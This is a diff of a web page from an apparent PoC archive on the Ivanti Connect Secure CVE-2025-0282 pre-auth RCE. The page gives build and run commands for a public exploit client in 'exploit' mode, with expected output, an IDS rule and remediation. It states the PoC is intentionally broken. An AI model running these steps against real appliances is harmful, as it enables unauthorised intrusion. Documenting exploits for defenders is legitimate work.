@@ -409,76 +409,33 @@
 Target:      Ivanti Connect Secure appliance (vulnerable firmware, network-accessible port 443)
 Attacker:    Linux host with GCC, make, openssl-dev, libssl-dev
 Tools:       Custom openconnect fork (openconnect-CVE-2025-0282 directory), GCC toolchain
-</code></pre><h3 id="setup-steps">Setup Steps</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/watchtowrlabs/CVE-2025-0282
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2025-0282/openconnect-CVE-2025-0282
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">./configure <span class="o">&amp;&amp;</span> make
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">MODE</span><span class="o">=</span>normal ./openconnect --protocol<span class="o">=</span>pulse --user<span class="o">=</span><span class="nb">test</span> &lt;TARGET_IP&gt;
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">MODE</span><span class="o">=</span>exploit ./openconnect --protocol<span class="o">=</span>pulse --user<span class="o">=</span><span class="nb">test</span> &lt;TARGET_IP&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="step-by-step-reproduction">Step-by-Step Reproduction</h3>
-<ol>
-<li>
-<p><strong>Normal mode probe</strong> - Verify the target is reachable and the IF-T stack is functional.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">MODE</span><span class="o">=</span>normal ./openconnect-CVE-2025-0282/openconnect --protocol<span class="o">=</span>pulse --user<span class="o">=</span><span class="nb">test</span> &lt;TARGET_IP&gt;
-</span></span><span class="line"><span class="cl"><span class="c1"># Success indicator: &#34;Enter user credentials: Password:&#34; prompt appears</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>Exploit mode trigger</strong> - Send the overflow payload.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">MODE</span><span class="o">=</span>exploit ./openconnect-CVE-2025-0282/openconnect --protocol<span class="o">=</span>pulse --user<span class="o">=</span><span class="nb">test</span> &lt;TARGET_IP&gt;
-</span></span><span class="line"><span class="cl"><span class="c1"># Vulnerability indicator: &#34;Failed to complete authentication&#34; + &#34;[!] Target might be vulnerable&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>Adapt offsets</strong> - The PoC ships with intentionally incomplete/broken hardcoded gadget addresses. Consult the watchTowr technical write-up to understand the technique and adapt offsets for the specific target firmware version.</p>
-</li>
-</ol>
-<h3 id="exploit-code">Exploit Code</h3>
-<blockquote>
-<p>See the <code>openconnect-CVE-2025-0282/</code> directory for the patched C source. The PoC is a modified openconnect client.</p></blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">MODE</span><span class="o">=</span>exploit ./openconnect --protocol<span class="o">=</span>pulse --user<span class="o">=</span><span class="nb">test</span> 10.20.5.4
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="expected-output">Expected Output</h3>
-<pre tabindex="0"><code>(*) Ivanti Connect Secure IFT TLS Stack Overflow pre-auth RCE (CVE-2025-0282)
+</code></pre><h3 id=setup-steps>Setup Steps</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/watchtowrlabs/CVE-2025-0282
+</span></span><span class=line><span class=cl><span class=nb>cd</span> CVE-2025-0282/openconnect-CVE-2025-0282
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>./configure <span class=o>&amp;&amp;</span> make
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>MODE</span><span class=o>=</span>normal ./openconnect --protocol<span class=o>=</span>pulse --user<span class=o>=</span><span class=nb>test</span> &lt;TARGET_IP&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>MODE</span><span class=o>=</span>exploit ./openconnect --protocol<span class=o>=</span>pulse --user<span class=o>=</span><span class=nb>test</span> &lt;TARGET_IP&gt;
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=proof-of-concept>Proof of Concept</h2><h3 id=step-by-step-reproduction>Step-by-Step Reproduction</h3><ol><li><p><strong>Normal mode probe</strong> - Verify the target is reachable and the IF-T stack is functional.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>MODE</span><span class=o>=</span>normal ./openconnect-CVE-2025-0282/openconnect --protocol<span class=o>=</span>pulse --user<span class=o>=</span><span class=nb>test</span> &lt;TARGET_IP&gt;
+</span></span><span class=line><span class=cl><span class=c1># Success indicator: &#34;Enter user credentials: Password:&#34; prompt appears</span>
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Exploit mode trigger</strong> - Send the overflow payload.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>MODE</span><span class=o>=</span>exploit ./openconnect-CVE-2025-0282/openconnect --protocol<span class=o>=</span>pulse --user<span class=o>=</span><span class=nb>test</span> &lt;TARGET_IP&gt;
+</span></span><span class=line><span class=cl><span class=c1># Vulnerability indicator: &#34;Failed to complete authentication&#34; + &#34;[!] Target might be vulnerable&#34;</span>
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Adapt offsets</strong> - The PoC ships with intentionally incomplete/broken hardcoded gadget addresses. Consult the watchTowr technical write-up to understand the technique and adapt offsets for the specific target firmware version.</p></li></ol><h3 id=exploit-code>Exploit Code</h3><blockquote><p>See the <code>openconnect-CVE-2025-0282/</code> directory for the patched C source. The PoC is a modified openconnect client.</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>MODE</span><span class=o>=</span>exploit ./openconnect --protocol<span class=o>=</span>pulse --user<span class=o>=</span><span class=nb>test</span> 10.20.5.4
+</span></span></code></pre></td></tr></table></div></div><h3 id=expected-output>Expected Output</h3><pre tabindex=0><code>(*) Ivanti Connect Secure IFT TLS Stack Overflow pre-auth RCE (CVE-2025-0282)
   - Sina Kheirkhah (@SinSinology) of watchTowr (sina@watchTowr.com)
 
 Connected to 10.20.5.4:443
@@ -488,221 +445,25 @@ Failed to read from TLS/DTLS socket: Error in the pull function.
 Failed to complete authentication
 
  [!] Target might be vulnerable
-</code></pre><hr>
-<h2 id="screenshots--evidence">Screenshots / Evidence</h2>
-<!-- Add paths to screenshots or embed them -->
-<ul>
-<li>No screenshots included in source repository.</li>
-</ul>
-<hr>
-<h2 id="detection--indicators-of-compromise">Detection &amp; Indicators of Compromise</h2>
-<pre tabindex="0"><code></code></pre><p><strong>SIEM / IDS Rule (example):</strong></p>
-<pre tabindex="0"><code>alert tcp any any -&gt; $IVANTI_MGMT 443 (msg:&#34;CVE-2025-0282 IFT Stack Overflow Probe&#34;; content:&#34;IF-T/TLS&#34;; dsize:&gt;8192; sid:9002026; rev:1;)
-</code></pre><hr>
-<h2 id="remediation">Remediation</h2>
-<table>
-  <thead>
-      <tr>
-          <th>Action</th>
-          <th>Detail</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><strong>Patch</strong></td>
-          <td>Upgrade Ivanti Connect Secure to 22.7R2.5 or later; Policy Secure to 22.7R1.2; ZTA Gateways to 22.8R2.2</td>
-      </tr>
-      <tr>
-          <td><strong>Workaround</strong></td>
-          <td>Run Ivanti&rsquo;s Integrity Checking Tool (ICT) to detect compromise; consider factory reset if compromise is suspected</td>
-      </tr>
-      <tr>
-          <td><strong>Config Hardening</strong></td>
-          <td>Restrict management and VPN port access to known IP ranges; enable enhanced logging; monitor for unexpected outbound connections</td>
-      </tr>
-  </tbody>
-</table>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0282">CVE-2025-0282</a></li>
-<li><a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/">watchTowr Technical Write-up - Exploitation Walkthrough and Techniques</a></li>
-<li><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283">Ivanti Security Advisory</a></li>
-<li><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">Mandiant Threat Intelligence Report</a></li>
-<li><a href="https://github.com/watchtowrlabs/CVE-2025-0282">Source Repository</a></li>
-<li><a href="https://www.infradead.org/openconnect/">OpenConnect Project</a></li>
-</ul>
-<hr>
-<h2 id="notes">Notes</h2>
-<p>The published PoC is intentionally broken in non-trivial ways and requires effort to adapt to a working exploit against a specific target - the hardcoded memory addresses and ROP gadget offsets need to be derived per firmware version. The watchTowr technical blog post provides the exploitation technique without the complete working payload. Mandiant confirmed exploitation in the wild, attributing activity to a suspected China-nexus espionage actor. This is a zero-day that was exploited before the vendor patch was available. Auto-ingested from <a href="https://github.com/watchtowrlabs/CVE-2025-0282">https://github.com/watchtowrlabs/CVE-2025-0282</a> on 2026-05-17.</p>
-
-    </div>
-
-    
-
-    
-    <nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800">
-      
-        <a href="/pocs/web/2026-05-17_jenkins-cli-arbitrary-file-read-rce/" class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800">
-          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in network</span>
-          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Jenkins CLI Arbitrary File Read to RCE (CVE-2024-23897)</span>
-        </a>
-      
-      
-        <a href="/pocs/cloud/2026-05-17_ingressnightmare-k8s-ingress-nginx-rce/" class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800">
-          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in network →</span>
-          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">IngressNightmare - Kubernetes Ingress-NGINX Unauthenticated RCE</span>
-        </a>
-      
-    </nav>
-  </div>
-
-  
-  <aside class="hidden lg:order-2 lg:block">
-    <div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40">
-  <div>
-  <div class="flex items-baseline justify-between">
-    <span class="font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-zinc-400">CVSS</span>
-    <span class="font-mono text-lg font-semibold text-red-500 dark:text-red-400">9.0<span class="text-xs text-zinc-400 dark:text-zinc-600">/10</span></span>
-  </div>
-  <div class="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-zinc-200 dark:bg-zinc-800">
-    <div class="h-full rounded-full bg-red-500" style="width: 90%"></div>
-  </div>
-</div>
-
-
-  <dl class="space-y-3 font-mono text-xs">
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
-      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400">
-  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical
-</span>
-</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">CVE</dt>
-      <dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2025-0282</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
-      <dd class="mt-1">
-        <a href="/pocs/network/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a>
-      </dd>
-    </div>
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Ivanti Connect Secure, Ivanti Policy Secure, Ivanti ZTA Gateways</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Ivanti Connect Secure prior to 22.7R2.5; Policy Secure prior to 22.7R1.2; ZTA Gateways prior to 22.8R2.2</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-17</dd>
-    </div>
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
-      <dd class="mt-1">
-        <span class="text-amber-600 dark:text-amber-400">unpatched</span>
-      </dd>
-    </div>
-  </dl>
-
-  
-  <div>
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
-    <div class="mt-2 flex flex-wrap gap-1.5">
-      
-      <a href="/tags/rce/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
-      
-      <a href="/tags/stack-overflow/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#stack-overflow</a>
-      
-      <a href="/tags/buffer-overflow/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#buffer-overflow</a>
-      
-      <a href="/tags/pre-auth/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#pre-auth</a>
-      
-      <a href="/tags/unauthenticated/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
-      
-      <a href="/tags/vpn/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#VPN</a>
-      
-      <a href="/tags/zero-day/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#zero-day</a>
-      
-      <a href="/tags/active-exploitation/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#active-exploitation</a>
-      
-      <a href="/tags/ivanti/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Ivanti</a>
-      
-      <a href="/tags/tls/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#TLS</a>
-      
-    </div>
-  </div>
-  
-
-  
-  <div>
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
-    <ul class="mt-2 space-y-1.5">
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0282" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2025-0282</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://github.com/watchtowrlabs/CVE-2025-0282" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/watchtowrlabs/CVE-2025-0282</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://www.infradead.org/openconnect/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.infradead.org/openconnect/</a>
-      </li>
-      
-    </ul>
-  </div>
-  <div class="border-t border-zinc-200 pt-4 dark:border-zinc-800">
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
-    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-05-17_ivanti-connect-secure-rce/" target="_blank" rel="noopener noreferrer"
-       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
-      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
-      intelseclab/poc-archive
-    </a>
-  </div>
-</div>
-</div>
-  </aside>
-</article>
-
-  </main>
-  <footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800">
-  <div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500">
-    <p class="font-mono">
-      PoC Archive — research artifacts for defensive and educational use only.
-    </p>
-    <p class="font-mono">
-      built with <a href="https://gohugo.io" class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages
-    </p>
-  </div>
-</footer>
-
-</body>
-</html>
+</code></pre><hr><h2 id=screenshots--evidence>Screenshots / Evidence</h2><ul><li>No screenshots included in source repository.</li></ul><hr><h2 id=detection--indicators-of-compromise>Detection & Indicators of Compromise</h2><pre tabindex=0><code></code></pre><p><strong>SIEM / IDS Rule (example):</strong></p><pre tabindex=0><code>alert tcp any any -&gt; $IVANTI_MGMT 443 (msg:&#34;CVE-2025-0282 IFT Stack Overflow Probe&#34;; content:&#34;IF-T/TLS&#34;; dsize:&gt;8192; sid:9002026; rev:1;)
+</code></pre><hr><h2 id=remediation>Remediation</h2><table><thead><tr><th>Action</th><th>Detail</th></tr></thead><tbody><tr><td><strong>Patch</strong></td><td>Upgrade Ivanti Connect Secure to 22.7R2.5 or later; Policy Secure to 22.7R1.2; ZTA Gateways to 22.8R2.2</td></tr><tr><td><strong>Workaround</strong></td><td>Run Ivanti&rsquo;s Integrity Checking Tool (ICT) to detect compromise; consider factory reset if compromise is suspected</td></tr><tr><td><strong>Config Hardening</strong></td><td>Restrict management and VPN port access to known IP ranges; enable enhanced logging; monitor for unexpected outbound connections</td></tr></tbody></table><hr><h2 id=references>References</h2><ul><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2025-0282>CVE-2025-0282</a></li><li><a href=https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/>watchTowr Technical Write-up - Exploitation Walkthrough and Techniques</a></li><li><a href=https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283>Ivanti Security Advisory</a></li><li><a href=https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day>Mandiant Threat Intelligence Report</a></li><li><a href=https://github.com/watchtowrlabs/CVE-2025-0282>Source Repository</a></li><li><a href=https://www.infradead.org/openconnect/>OpenConnect Project</a></li></ul><hr><h2 id=notes>Notes</h2><p>The published PoC is intentionally broken in non-trivial ways and requires effort to adapt to a working exploit against a specific target - the hardcoded memory addresses and ROP gadget offsets need to be derived per firmware version. The watchTowr technical blog post provides the exploitation technique without the complete working payload. Mandiant confirmed exploitation in the wild, attributing activity to a suspected China-nexus espionage actor. This is a zero-day that was exploited before the vendor patch was available. Auto-ingested from <a href=https://github.com/watchtowrlabs/CVE-2025-0282>https://github.com/watchtowrlabs/CVE-2025-0282</a> on 2026-05-17.</p></div><nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800"><a href=/pocs/web/2026-05-17_jenkins-cli-arbitrary-file-read-rce/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in network</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Jenkins CLI Arbitrary File Read to RCE (CVE-2024-23897)</span>
+</a><a href=/pocs/cloud/2026-05-17_ingressnightmare-k8s-ingress-nginx-rce/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in network →</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">IngressNightmare - Kubernetes Ingress-NGINX Unauthenticated RCE</span></a></nav></div><aside class="hidden lg:order-2 lg:block"><div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40"><div><div class="flex items-baseline justify-between"><span class="font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-zinc-400">CVSS</span>
